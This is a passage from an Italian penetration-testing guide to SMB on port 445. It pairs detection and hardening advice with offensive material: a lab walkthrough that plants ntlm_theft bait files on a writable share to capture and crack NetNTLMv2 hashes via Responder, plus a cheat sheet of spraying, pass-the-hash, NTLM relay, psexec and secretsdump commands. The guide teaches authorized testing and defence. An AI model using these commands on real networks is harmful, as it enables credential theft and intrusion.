Se la versione non è accettata, prova `vers=2.1` o `vers=2.0`. Per una share anonima usa `-o guest` al posto di username e password.

**Windows:**

```powershell
net use Z: \\10.10.10.50\IT-Deploy /user:corp\jsmith Password1
dir Z:\
net use Z: /delete
```

**macOS:**

```bash
mkdir -p ~/smbshare
mount_smbfs //jsmith@10.10.10.50/IT-Deploy ~/smbshare
umount ~/smbshare
```

Da Finder puoi anche usare `Cmd+K` e scrivere `smb://10.10.10.50/IT-Deploy`. In tutti i casi la porta di destinazione è la 445: se il mount si blocca, controlla prima che sia raggiungibile.

## Samba su Linux: Configurazioni Pericolose e SambaCry

Se il fingerprint dice che dietro la 445 c'è Samba e non Windows, le regole cambiano: niente `ADMIN$` né domain controller Windows, ma un file `smb.conf` che può essere configurato male. In `nmap` e `nxc` lo riconosci dal nome dell'OS e dal banner.

Configurazioni da cercare quando hai accesso alla macchina (o da chiedere durante un audit):

```ini
[public]
   path = /srv/samba/public
   guest ok = yes
   writable = yes
```

| Parametro                                   | Rischio                                                      |
| ------------------------------------------- | ------------------------------------------------------------ |
| `guest ok = yes`                            | Chiunque entra senza password                                |
| `writable = yes` insieme a `guest ok = yes` | Chiunque può anche caricare file                             |
| `map to guest = Bad User`                   | Un utente sbagliato diventa guest invece di essere rifiutato |
| `server min protocol` basso                 | Accetta dialect vecchi come SMB1                             |
| `server signing` non obbligatorio           | Rende possibile il relay                                     |

**SambaCry (CVE-2017-7494).** Un client autenticato con accesso in scrittura a una share può caricare una libreria condivisa (`.so`) e far sì che il server la carichi ed esegua: il risultato è esecuzione di codice sul server Samba, spesso con privilegi alti. Colpisce Samba dalla 3.5.0 fino alle versioni corrette 4.6.4, 4.5.10 e 4.4.14. È raro su sistemi aggiornati, ma lo trovi ancora in lab e CTF. La mitigazione storica è il parametro `nt pipe support = no`; la soluzione vera è aggiornare Samba. Montare la share con l'opzione `noexec` riduce ulteriormente il rischio.

Per il fingerprint della versione:

```bash
nmap -p 445 -Pn --script smb-os-discovery 10.10.10.60
nxc smb 10.10.10.60
```

Se la versione di Samba è vecchia, controlla le vulnerabilità note prima di provare qualsiasi exploit, e solo in un ambiente autorizzato.

## Porta 445 SMB: TCP o UDP?

**TCP.** SMB sulla 445 usa solo TCP: `445/tcp`, servizio `microsoft-ds`. IANA registra anche `445/udp`, ma SMB non lo usa: in una scansione UDP la 445 risulta di solito chiusa o filtrata.

| Porta | Protocollo | Uso                                                                                                      |
| ----- | ---------- | -------------------------------------------------------------------------------------------------------- |
| 445   | TCP        | SMB diretto (quello che ti interessa)                                                                    |
| 139   | TCP        | SMB su NetBIOS Session (legacy)                                                                          |
| 137   | UDP        | NetBIOS Name Service                                                                                     |
| 138   | UDP        | NetBIOS Datagram                                                                                         |
| 443   | UDP        | SMB over QUIC (Windows Server 2022 Azure Edition, Windows Server 2025 e Windows 11 recenti, non diffuso) |

```bash
nmap -sS -p 445 10.10.10.10        # TCP: this is the one that matters
nmap -sU -p 137,138 10.10.10.10    # UDP: NetBIOS, not SMB
```

Se in un lab la 445 TCP risulta `filtered`, il problema è il firewall, non il protocollo: non perdere tempo con la scansione UDP.

## SMB, WinRM e RDP a Confronto

| Aspetto            | SMB (445/TCP)                      | [WinRM](https://hackita.it/articoli/porta-5985-winrm/) (5985/5986)        | [RDP](https://hackita.it/articoli/porta-3389-rdp/) (3389) |
| ------------------ | ---------------------------------- | ------------------------------------------------------------------------- | --------------------------------------------------------- |
| Autenticazione     | NTLM, Kerberos                     | NTLM, Kerberos                                                            | NLA (NTLM/Kerberos)                                       |
| Esecuzione comandi | psexec, smbexec, wmiexec (con RPC) | PowerShell remoting, [Evil-WinRM](https://hackita.it/articoli/evilwinrm/) | Sessione grafica                                          |
| Pass-the-Hash      | Sì                                 | Sì                                                                        | Solo con Restricted Admin                                 |
| Quando preferirlo  | Share, file, esecuzione con admin  | Se SMB è filtrato                                                         | Se serve la GUI                                           |

La 445 è centrale in molti percorsi, ma non in tutti: WinRM, RDP e WMI usano altre porte, e il relay NTLM può colpire anche LDAP o HTTP.

## Attack Chain SMB: la Sequenza Completa

```text
Discovery (nmap, 445 open) → Fingerprint (OS, dialect, signing) → Enumeration (NetExec, smbmap, enum4linux-ng)
→ Anonymous/Null Session → Share & Credential Discovery (SYSVOL, file sensibili)
→ Authentication Attacks (spray, Pass-the-Hash, NTLM Relay) → Exploitation & Lateral Movement (psexec, wmiexec, Impacket)
→ Post-Exploitation (secretsdump, credential dumping) → Active Directory (DCSync, privilege escalation)
```

Ogni freccia è condizionata da quella precedente: non trovi utenti validi per lo spray senza prima l'enumerazione, e non provi il relay senza prima aver verificato il signing. È la logica con cui questa guida è ordinata, dalla Fase 1 alla Fase 10.

## Troubleshooting

| Sintomo                                         | Causa probabile                                | Cosa controllare                                     |
| ----------------------------------------------- | ---------------------------------------------- | ---------------------------------------------------- |
| `Connection refused` / filtered su 445          | Firewall o servizio assente                    | `nmap -Pn -p 445`, regole di rete, pivot             |
| `STATUS_ACCESS_DENIED` su `ADMIN$`              | Utente non admin locale                        | Gruppi sul target, `--local-auth` per account locali |
| `STATUS_LOGON_FAILURE` con hash                 | Hash non NT, utente o dominio errato           | Formato (`:hashNT`), dominio, blocco account         |
| `NT_STATUS_BAD_NETWORK_NAME`                    | Share inesistente                              | Elenco share                                         |
| Il relay fallisce con `Signing is required`     | Target con signing richiesto                   | Usa solo target in `--gen-relay-list`                |
| Relay avviato ma nessuna connessione            | Nessuna autenticazione in transito             | Responder/coercizione, porte SMB/HTTP libere         |
| `STATUS_PASSWORD_MUST_CHANGE`, account bloccato | Policy di dominio                              | Policy e lockout (Fase 5)                            |
| psexec si connette ma niente shell              | AV/EDR blocca il servizio                      | Prova un altro metodo, controlla i log               |
| Kerberos fallisce                               | IP al posto del FQDN, orario non sincronizzato | Nome DNS, `ntpdate`/skew di orario                   |
| `mount error(95)` o `mount error(112)` su Linux | Versione SMB non accettata                     | Aggiungi `vers=3.0` o `vers=2.1`                     |

## Laboratorio: Furto di Hash con ntlm\_theft e Responder

Scenario da lab (Hack The Box o rete di test): hai accesso in scrittura a una share e un utente, o un job automatico, la apre. Vuoi catturare il suo hash NetNTLMv2.

**1. Responder in ascolto** sulla tua interfaccia VPN:

```bash
sudo responder -I tun0 -v
```

**2. Genera i file con `ntlm_theft`**, puntando al tuo IP:

```bash
pip3 install xlsxwriter
python3 ntlm_theft.py -g modern -s 10.10.14.5 -f Report_Q4
```

* `-g modern` genera i formati che funzionano su Windows recenti (salta `.scf`, `autorun.inf`, `desktop.ini`, Zoom). `-g all` li crea tutti; con `-g xlsx` ne scegli uno solo.
* `-s` è l'IP del tuo listener, `-f` il nome base dei file.

Ottieni una cartella `Report_Q4/` con `.url`, `.lnk`, `.docx`, `.xlsx`, `.pdf`, `.htm` e altri.

**3. Carica il file sulla share scrivibile:**

```bash
smbclient //10.10.10.50/Public -U 'corp.local\jsmith%Password1' -c "put Report_Q4/Report_Q4.url"
```

**4. Aspetta che qualcuno lo apra.** Quando la vittima apre la cartella (`.url`, `.lnk`) o il documento (`.docx`, `.xlsx`, `.pdf`), Windows prova ad autenticarsi verso `\\10.10.14.5\...` e Responder cattura l'hash:

```text
[SMB] NTLMv2-SSP Client   : 10.10.10.20
[SMB] NTLMv2-SSP Username : CORP\mrossi
[SMB] NTLMv2-SSP Hash     : mrossi::CORP:1122334455667788:9f4c2a...:0101000000...
```

(Output illustrativo.)

**5. Crack offline** dell'hash salvato (cartella `/usr/share/responder/logs/` o `/opt/Responder/logs/`, a seconda dell'installazione):

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

È un hash **NetNTLMv2**: non si usa per Pass-the-Hash, si cracka oppure si rilancia (vedi la Fase 8, con SMB/HTTP di Responder spenti).

| Tipo di file                         | Serve                             |
| ------------------------------------ | --------------------------------- |
| `.url`, `.lnk`                       | Che l'utente apra la cartella     |
| `.docx`, `.xlsx`, `.pdf`, `.htm`     | Che l'utente apra il file         |
| `.scf`, `autorun.inf`, `desktop.ini` | Funzionano solo su Windows datati |

Funziona solo se: la share è scrivibile, un utente (o un'attività automatica) apre il file, e la sua macchina raggiunge il tuo IP sulla 445. Se non arriva nulla, controlla VPN, `tun0` e che nessun altro servizio occupi la 445 sul tuo host. Nei lab HTB spesso c'è un bot che simula l'apertura. Attenzione: puliscilo a fine test, i file restano sulla share. Vedi anche [Responder](https://hackita.it/articoli/responder/) e [Hashcat](https://hackita.it/articoli/hashcat/).

## Detection e Telemetria

Gli eventi esistono solo se auditing e raccolta sono configurati (Security log, Sysmon, EDR).

| Comportamento               | Cosa osservare                                                                      |
| --------------------------- | ----------------------------------------------------------------------------------- |
| Accessi di rete             | 4624 (Logon Type 3), 4625 (fallimenti), 4776 (validazione NTLM sul DC)              |
| Accesso alle share          | 5140, 5145 (richiedono audit file share), volume di file letti                      |
| Installazione di servizi    | 7045 (System), 4697 (Security): psexec, smbexec                                     |
| Processi                    | 4688, Sysmon 1: `cmd.exe`/`powershell.exe` figli di `services.exe` o `wmiprvse.exe` |
| Connessioni di rete         | Sysmon 3: connessioni verso 445 da processi insoliti                                |
| Spray                       | Molti 4625/4776 da una sola sorgente su molti utenti                                |
| Scansioni SMB               | Molte connessioni verso la 445 di host diversi dalla stessa sorgente in poco tempo  |
| Uscita NTLM verso l'esterno | Connessioni SMB (445) verso IP fuori dalla rete aziendale: possibile fuga di hash   |
| Modifiche AD                | Cambi a gruppi, ACL e permessi di replica                                           |

Un metodo "senza file su disco" può comunque generare processi, log ed eventi correlabili. Per l'analisi del traffico: [Wireshark](https://hackita.it/articoli/wireshark/), [tcpdump](https://hackita.it/articoli/tcpdump/).

## Hardening

Verifica lo stato reale prima di cambiare:

```powershell
Get-SmbServerConfiguration | Select RequireSecuritySignature, EnableSMB1Protocol, EncryptData, RejectUnencryptedAccess
Get-SmbShare
Get-SmbShareAccess -Name "IT-Deploy"
Get-SmbConnection
```

* **Signing richiesto** via GPO: *Microsoft network server: Digitally sign communications (always)* e lo stesso lato client
* **Disabilita SMBv1**: `Set-SmbServerConfiguration -EnableSMB1Protocol $false`
* **Limita l'accesso anonimo**: restrizione di sessioni null, `RestrictAnonymous`, nessun accesso guest
* **Share a minimo privilegio**: niente `Everyone`, controlla sia permessi share sia NTFS
* **Firewall**: blocca la 445 ai confini di rete e tra segmenti che non ne hanno bisogno ([firewall](https://hackita.it/articoli/firewall/))
* **Protezioni anti-relay**: LDAP signing e channel binding sui DC, EPA sui servizi HTTP, ridurre o disabilitare NTLM dove possibile, Kerberos al suo posto
* **Password amministrative locali uniche** ([LAPS](https://hackita.it/articoli/getlapspassword/)) per limitare il riuso dell'hash tra host
* **SMB encryption** per le share con dati sensibili
* **Patch**: tieni aggiornati Windows e Samba, in particolare dopo le falle SMB del 2025 (CVE-2025-33073 e CVE-2025-24054)

**Come chiudere o bloccare la porta 445.** Sui client, che non devono ospitare share, puoi bloccare le connessioni in entrata con il firewall di Windows:

```powershell
New-NetFirewallRule -DisplayName "Block SMB inbound" -Direction Inbound -Protocol TCP -LocalPort 445 -Action Block
```

Sul perimetro, la 445 non deve mai essere raggiungibile da Internet, né in entrata né in uscita verso l'esterno: l'uscita blocca anche le fughe di hash verso server controllati da un attaccante. Non bloccarla su file server e domain controller senza aver verificato che nessun servizio interno ne dipenda.

Su Samba (Linux) applica le stesse idee nel file `smb.conf`: `server min protocol` alto, `server signing = mandatory`, niente `guest ok` e `writable` insieme, e aggiornamenti regolari del pacchetto. Una 445 ridotta al minimo, con signing richiesto e senza SMBv1, toglie all'attaccante la maggior parte dei percorsi descritti in questa guida.

## Cheat Sheet Finale

Tutti i comandi essenziali di questa guida, in un unico posto da consultare durante un pentest.

| Azione                     | Comando                                                                           | Fase |
| -------------------------- | --------------------------------------------------------------------------------- | ---- |
| Scoperta host              | `nmap -p 445 --open -Pn 10.10.10.0/24`                                            | 1    |
| Fingerprint OS e signing   | `nmap -p 445 --script smb-os-discovery,smb-protocols,smb2-security-mode [target]` | 1-2  |
| Panoramica di rete         | `nxc smb 10.10.10.0/24`                                                           | 1    |
| Lista target senza signing | `nxc smb [subnet] --gen-relay-list relay_targets.txt`                             | 2    |
| Accesso anonimo            | `smbclient -N -L //[target]`, `nxc smb [target] -u '' -p ''`                      | 3    |
| Share con credenziali      | `smbmap -H [target] -u [user] -p [pass]`                                          | 4    |
| Spider contenuti share     | `nxc smb [target] -u [user] -p [pass] -M spider_plus`                             | 4    |
| Enum utenti/gruppi         | `nxc smb [target] -u [user] -p [pass] --users --groups`                           | 5    |
| Policy password            | `nxc smb [target] -u [user] -p [pass] --pass-pol`                                 | 5    |
| Password spraying          | `nxc smb [target] -u users.txt -p '[pass]' --continue-on-success`                 | 6    |
| Pass-the-Hash              | `nxc smb [target] -u [user] -H [NT_hash] --shares`                                | 6    |
| Esecuzione remota          | `impacket-psexec` / `impacket-wmiexec [domain]/[user]:'[pass]'@[target]`          | 7    |
| NTLM Relay                 | `impacket-ntlmrelayx -tf relay_targets.txt -smb2support`                          | 8    |
| Check EternalBlue          | `nmap --script smb-vuln-ms17-010 [target]`                                        | 9    |
| Dump credenziali           | `impacket-secretsdump [domain]/[user]:'[pass]'@[target]`                          | 10   |

## FAQ

**Cos'è SMB?** È il protocollo `Server Message Block`, il significato è: protocollo a blocchi di messaggi del server. Serve a condividere file, stampanti e named pipe in rete, soprattutto su Windows.

**A cosa serve la porta 445?** È la porta TCP usata da SMB per file e stampanti, named pipe, RPC e autenticazione su Windows. È praticamente sempre la prima porta che un pentester controlla in una rete Windows.

**Cosa gira sulla porta 445?** Il servizio SMB diretto su TCP (`microsoft-ds`): condivisione file, named pipe (`IPC$`), RPC per utenti e gruppi, ed esecuzione remota con credenziali amministrative.

**Che porta usa SMB?** La 445 TCP per SMB diretto. La 139 TCP è la versione legacy su NetBIOS, mentre 137 e 138 UDP sono servizi NetBIOS.

**Qual è la porta predefinita di SMB?** 445/TCP su tutte le versioni moderne di Windows. La 139/TCP resta attiva per compatibilità con client molto vecchi.

**Qual è la differenza tra porta 445 e 139?** La 445 è SMB direttamente su TCP; la 139 usa NetBIOS Session Service ed è legacy.

**SMB e CIFS sono la stessa cosa?** CIFS è il nome delle prime versioni di SMB (SMB1). Oggi si parla di SMB, e il comando `mount -t cifs` su Linux supporta anche SMB2 e SMB3.

**Che differenza c'è tra SMB e Samba?** SMB è il protocollo, Samba è il software open source che lo implementa su Linux e Unix.

**Cos'è una null session SMB?** È una connessione SMB con utente e password vuoti. Se il server la accetta, può lasciare elencare share, `IPC$` e, in certi casi, utenti e gruppi via RPC.

**Come faccio l'enumerazione SMB?** Parti da `nmap` per il fingerprint, poi `nxc smb`, `smbmap` ed `enum4linux-ng` per share, utenti, gruppi e policy. La sequenza completa è nella [cheat sheet per fase](#smb-enumeration-cheat-sheet-per-fase) di questa guida.

**Come verifico se il signing SMB è richiesto?** `nmap -p 445 --script smb2-security-mode <target>` oppure `nxc smb <target>` e leggi il campo `signing`.

**Cos'è un attacco di SMB relay?** È l'inoltro di un'autenticazione NTLM catturata verso un altro host SMB che non richiede il signing, per ottenere accesso con l'identità rilanciata. Vedi la Fase 8 per i prerequisiti reali.

**EternalBlue funziona ancora?** Solo su sistemi con SMBv1 e senza patch MS17-010: oggi quasi esclusivamente nei lab e nelle macchine CTF.

**Signing disabilitato significa SMB relay riuscito?** No: servono anche un'autenticazione NTLM in transito e privilegi sufficienti sul target.

**Come si chiude la porta 445?** Con una regola del firewall che blocca la 445 TCP in entrata sui sistemi che non condividono file, e al perimetro di rete verso Internet. Sui file server e sui domain controller verifica prima le dipendenze.

**È legale scansionare la porta 445?** Solo su sistemi tuoi, con autorizzazione scritta o in lab dedicati.

*Riferimenti: Microsoft \[MS-SMB2] (specifica del protocollo SMB 2/3) e documentazione Nmap NSE per `smb2-security-mode`. Verifica sempre opzioni e output sulla versione dei tool che usi.*
